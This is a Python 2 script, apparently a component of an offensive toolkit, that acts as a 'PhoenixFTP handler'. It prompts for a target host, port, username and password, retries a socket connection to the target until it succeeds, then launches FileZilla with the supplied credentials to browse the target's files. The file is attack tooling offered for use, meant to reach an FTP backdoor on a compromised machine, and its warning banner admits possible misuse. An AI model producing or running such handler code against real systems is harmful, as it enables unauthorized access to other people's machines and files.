import socket
import subprocess
from core import colors
import time
import os

s = socket.socket()

def main(RHOST, RPORT, USERNAME, PASSWORD):
    print colors.status.OK + " Waiting for connections on %s:%s .."%(RHOST, str(RPORT))
    connect(RHOST, RPORT, USERNAME, PASSWORD)

def connect(RHOST, RPORT, USERNAME, PASSWORD):
    try:
        s.connect((RHOST, int(RPORT)))
        print colors.status.SUCCESS + " %s:%s ==> Connection maintained."%(RHOST, str(RPORT))
        time.sleep(1)
        print colors.color.RED + """
        ***********************************************************
        * Launching filezilla ftp client to connect to the target *
        * Warning : if you close this windows, filezilla also wi- * 
        * ll be closed.. DONT BE EVIL.. Use this on your own risk * 
        ***********************************************************
        """ + colors.color.ENDC
        time.sleep(2)
        os.system("xterm -e filezilla %s:%s@%s:%s "%(USERNAME, PASSWORD, RHOST, RPORT))
    except socket.error:
        time.sleep(1)
        connect(RHOST, RPORT, USERNAME, PASSWORD)

if __name__ == '__main__':
    print ""
    print colors.color.BLUE + "PhoenixFTP handler, coded by KRYPT0N"
    print ""
    print colors.color.YELLOW + "Handler settings : " + colors.color.ENDC
    print "------------------ "
    rhost = raw_input('rhost : ')
    rport = raw_input('rport : ')
    username = raw_input('username : ')
    password = raw_input('password : ')
    print ""
    main(rhost, int(rport), username, password)        
